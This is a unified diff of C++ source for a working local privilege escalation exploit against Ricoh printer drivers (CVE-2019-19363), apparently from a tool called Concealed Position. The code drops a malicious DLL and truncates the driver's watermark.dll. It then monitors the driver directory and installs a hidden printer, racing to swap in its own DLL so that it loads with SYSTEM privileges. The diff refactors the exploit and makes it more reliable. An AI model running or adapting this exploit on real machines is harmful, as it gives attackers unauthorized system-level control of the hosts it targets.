@@ -10,16 +10,20 @@
 #include "poisondamage.hpp"
 #include "inject_me.hpp"
 
+/*
+ * This code is largely based on the code shared by Pentagrid in their most excellent
+ * blog for CVE-2019-19363:
+ * 
+ * https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/
+ * 
+ * All credit to them. I have only modified it to be more C++-ey (to me), to operate within the confines of
+ * Concealed Position and optimized the exploit... I think :P
+*/
+
 namespace
 {
-#define MAX_BUFFER  4096
-
-    const WCHAR* const BaseDirName = L"C:\\ProgramData";
-    const WCHAR* TargetDllFullFilePath, * TargetDLLRelFilePath, * MaliciousLibraryFile, * PrinterName;
-    DWORD dwNotifyFilter = FILE_NOTIFY_CHANGE_LAST_WRITE |
-        FILE_NOTIFY_CHANGE_SIZE |
-        FILE_NOTIFY_CHANGE_LAST_ACCESS |
-        FILE_NOTIFY_CHANGE_CREATION;
+    const unsigned int MAX_BUFFER = 4096;
+    const DWORD dwNotifyFilter = FILE_NOTIFY_CHANGE_LAST_WRITE | FILE_NOTIFY_CHANGE_SIZE | FILE_NOTIFY_CHANGE_LAST_ACCESS | FILE_NOTIFY_CHANGE_CREATION;
 
     typedef struct _DIRECTORY_INFO {
         HANDLE      hDir;
@@ -29,68 +33,96 @@ namespace
         OVERLAPPED  Overlapped;
     } DIRECTORY_INFO, * PDIRECTORY_INFO, * LPDIRECTORY_INFO;
 
-    DIRECTORY_INFO  DirInfo;
+    void stompOnTarget(const WCHAR* p_target)
+    {
+        if (HANDLE hFile = CreateFile(p_target, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL))
+        {
+            std::wcout << "[+] File " << p_target << " has been truncated" << std::endl;
+            CloseHandle(hFile);
+        }
+        else
+        {
+            // standard behavior on first install though
+            std::cerr << "[!] File " << p_target << " could not be truncated" << std::endl;
+        }
+    }
 
-    void WINAPI HandleDirectoryChange(HANDLE dwCompletionPort) {
-        DWORD numBytes, cbOffset;
-        LPDIRECTORY_INFO di;
-        LPOVERLAPPED lpOverlapped;
-        PFILE_NOTIFY_INFORMATION fni;
-        int change_counter = 2;
-        WCHAR FileName[MAX_PATH];
+    HANDLE configureMonitoring(DIRECTORY_INFO& p_dir_info)
+    {
+        const WCHAR* const BaseDirName = L"C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\";
+        std::wcout << "[+] Configuring monitoring of " << BaseDirName << std::endl;
+        lstrcpy(p_dir_info.lpszDirName, BaseDirName);
 
-        do {
+        // Get a handle to the directory
+        p_dir_info.hDir = CreateFile(BaseDirName, FILE_LIST_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
+        if (p_dir_info.hDir == INVALID_HANDLE_VALUE)
+        {
+            std::wcerr << "[-] Unable to open directory " << BaseDirName << " - GLE = " << GetLastError() << std::endl;
+        }
 
-            GetQueuedCompletionStatus(dwCompletionPort, &numBytes, (PULONG_PTR)&di, &lpOverlapped, INFINITE);
+        HANDLE hCompPort = CreateIoCompletionPort(p_dir_info.hDir, NULL, (ULONG_PTR)&p_dir_info, 0);
+        if (hCompPort == NULL)
+        {
+            std::cerr << "[-] CreateIoCompletionPort() failed." << std::endl;
+            return 0;
+        }
 
-            if (di) {
-                fni = (PFILE_NOTIFY_INFORMATION)di->lpBuffer;
+        ReadDirectoryChangesW(p_dir_info.hDir, p_dir_info.lpBuffer, MAX_BUFFER, TRUE, dwNotifyFilter, &p_dir_info.dwBufLength, &p_dir_info.Overlapped, NULL);
+        return hCompPort;
+    }
 
-                do {
+    void HandleDirectoryChange(HANDLE dwCompletionPort, const WCHAR* p_target)
+    {    
+        int change_counter = 100;
+        LPDIRECTORY_INFO di = NULL;
+
+        do
+        {
+            DWORD numBytes = 0;
+            LPOVERLAPPED lpOverlapped = NULL;
+            if (!GetQueuedCompletionStatus(dwCompletionPort, &numBytes, (PULONG_PTR)&di, &lpOverlapped, 2000))
+            {
+                std::cout << "[-] Directory watch timed out." << std::endl;
+                return;
+            }
+
+            if (di)
+            {
+                PFILE_NOTIFY_INFORMATION fni = (PFILE_NOTIFY_INFORMATION)di->lpBuffer;
+
+                DWORD cbOffset = 0;
+                do
+                {
                     cbOffset = fni->NextEntryOffset;
-
-                    // get filename
-                    size_t num_elem = fni->FileNameLength / sizeof(WCHAR);
-                    if (num_elem >= sizeof(FileName) / sizeof(WCHAR)) num_elem = 0;
-
-                    wcsncpy_s(FileName, sizeof(FileName) / sizeof(WCHAR), fni->FileName, num_elem);
-                    FileName[num_elem] = '\0';
-                    wprintf(L"+ Event for %s [%d]\n", FileName, change_counter);
-
-                    if (fni->Action == FILE_ACTION_MODIFIED) {
-
-                        if (!wcscmp(FileName, TargetDLLRelFilePath)) {
-
+                    if (fni->Action == FILE_ACTION_MODIFIED)
+                    {
+                        std::wstring filename(fni->FileName, fni->FileNameLength);
+                        if (!wcsncmp(filename.c_str(), L"watermark.dll", filename.size()))
+                        {
+                            change_counter--;
                             if (change_counter > 0)
-                                change_counter--;
-                            if (change_counter == 0) {
-                                change_counter--;
-
-                                if (CopyFile(MaliciousLibraryFile, TargetDllFullFilePath, FALSE))
-                                    wprintf(L"+ File %s copied to %s.\n", MaliciousLibraryFile, TargetDllFullFilePath);
-
-                                else {
-                                    wchar_t buf[256];
-
-                                    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
-                                        NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
-                                        buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
-
-                                    wprintf(L"+ Failed to copy file %s to %s: %s\n", MaliciousLibraryFile, TargetDllFullFilePath, buf);
-                                }
-
+                            {
+                                // just try to copy. don't check error status. it doesn't matter.
+                                CopyFile(L"Dll.dll", p_target, FALSE);
+                            }
+                            else
+                            {
+                                // welp. I guess it's not gonna happen?
                                 return;
-                            } // end of trigger part
+                            }
                         }
                     } // eo action mod
                     fni = (PFILE_NOTIFY_INFORMATION)((LPBYTE)fni + cbOffset);
-
-                } while (cbOffset);
+                }
+                while (cbOffset);
 
                 // Reissue the watch command
                 ReadDirectoryChangesW(di->hDir, di->lpBuffer, MAX_BUFFER, TRUE, dwNotifyFilter, &di->dwBufLength, &di->Overlapped, NULL);
             }
-        } while (di);
+        }
+        while (di);
     }
 
     bool installPrinter(const std::string& p_driver)
@@ -104,11 +136,11 @@ namespace
         ZeroMemory(&printerInfo, sizeof(printerInfo));
         printerInfo.pPortName = (LPWSTR)L"lpt1:";
         printerInfo.pDriverName = (LPWSTR)wdriver.c_str();
-        printerInfo.pPrinterName = (LPWSTR)L"Ricoh";
+        printerInfo.pPrinterName = (LPWSTR)L"Concealed Position: Ricoh";
         printerInfo.pPrintProcessor = (LPWSTR)L"WinPrint";
         printerInfo.pDatatype = (LPWSTR)L"RAW";
         printerInfo.pComment = (LPWSTR)L"Poison Damage";
-        printerInfo.pLocation = (LPWSTR)L"Shared Ricoh Printer";
+        printerInfo.pLocation = (LPWSTR)L"Feywild";
         printerInfo.Attributes = PRINTER_ATTRIBUTE_RAW_ONLY | PRINTER_ATTRIBUTE_HIDDEN;
         printerInfo.AveragePPM = 9001;
         HANDLE hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printerInfo);
@@ -136,13 +168,6 @@ PoisonDamage::~PoisonDamage()
 
 bool PoisonDamage::do_exploit()
 {
-    HANDLE  hCompPort = NULL;                 // Handle To a Completion Port
-
-    PrinterName = L"PCL6 Driver for Universal Print";
-    TargetDllFullFilePath = L"C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\watermark.dll";
-    TargetDLLRelFilePath = L"RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\watermark.dll";
-    MaliciousLibraryFile = L"Dll.dll";
-
     std::cout << "[+] Dropping " << m_malicious_dll << " to disk" << std::endl;
     std::ofstream dll_out(m_malicious_dll, std::ofstream::out | std::ofstream::binary | std::ofstream::trunc);
     if (!dll_out.is_open())
@@ -156,58 +181,38 @@ bool PoisonDamage::do_exploit()
     dll_out.flush();
     dll_out.close();
 
-    std::wcout << "[+] Monitoring directory " << BaseDirName << std::endl;
+    const WCHAR* target_path = L"C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\watermark.dll";
 
-    // Get a handle to the directory
-    DirInfo.hDir = CreateFile(BaseDirName,
-        FILE_LIST_DIRECTORY,
-        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-        NULL,
-        OPEN_EXISTING,
-        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED,
-        NULL);
-
-    if (DirInfo.hDir == INVALID_HANDLE_VALUE)
-    {
-        wprintf(L"[-] Unable to open directory %s. GLE=%ld. Terminating...\n", BaseDirName, GetLastError());
-        return false;
-    }
-
-    lstrcpy(DirInfo.lpszDirName, BaseDirName);
-
-    if (HANDLE hFile = CreateFile(TargetDllFullFilePath,
-        GENERIC_WRITE,
-        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-        NULL,
-        CREATE_ALWAYS,
-        FILE_ATTRIBUTE_NORMAL,
-        NULL)) {
-        wprintf(L"[+] File %s created\n", TargetDllFullFilePath);
-        CloseHandle(hFile);
-    }
-    else
-        wprintf(L"[+] File %s could not be created\n", TargetDllFullFilePath);
-
-
-    if ((hCompPort = CreateIoCompletionPort(DirInfo.hDir, hCompPort, (ULONG_PTR)&DirInfo, 0)) == NULL) {
-        wprintf(L"[-] CreateIoCompletionPort() failed.\n");
-        return false;
-    }
-
-    // Start watching
     bool loop = true;
     while (loop)
     {
-        ReadDirectoryChangesW(DirInfo.hDir, DirInfo.lpBuffer, MAX_BUFFER, TRUE, dwNotifyFilter, &DirInfo.dwBufLength, &DirInfo.Overlapped, NULL);
-        std::thread watch(HandleDirectoryChange, hCompPort);
+        // truncate the target file
+        stompOnTarget(target_path);
+
+        // configure monitoring of the target directory
+        DIRECTORY_INFO  DirInfo = {};
+        HANDLE hCompPort = configureMonitoring(DirInfo);
+        if (hCompPort == 0)
+        {
+            return false;
+        }
+
+        // start the watcher thread and trigger installation
+        std::thread watch(HandleDirectoryChange, hCompPort, target_path);
         installPrinter(m_driverName);
         watch.join();
-        std::cout << "[+] Sleep for 3 seconds" << std::endl;
-        std::this_thread::sleep_for(std::chrono::milliseconds(3000));
 
+        // monitor cleanup
+        PostQueuedCompletionStatus(hCompPort, 0, 0, NULL);
+        CloseHandle(DirInfo.hDir);
+        CloseHandle(hCompPort);
+
+        // did we succeed?
         if (!std::filesystem::exists("C:\\result.txt"))
         {
             std::cout << "[-] Failed! Try the exploit again!" << std::endl;
+            std::cout << "[+] Sleep for 10 seconds" << std::endl;
+            std::this_thread::sleep_for(std::chrono::milliseconds(10000));
         }
         else
         {
@@ -218,8 +223,5 @@ bool PoisonDamage::do_exploit()
 
     std::cout << "[+] Cleaning up dropped dll" << std::endl;
     _unlink(m_malicious_dll.c_str());
-    PostQueuedCompletionStatus(hCompPort, 0, 0, NULL);
-    CloseHandle(DirInfo.hDir);
-    CloseHandle(hCompPort);
     return true;
 }
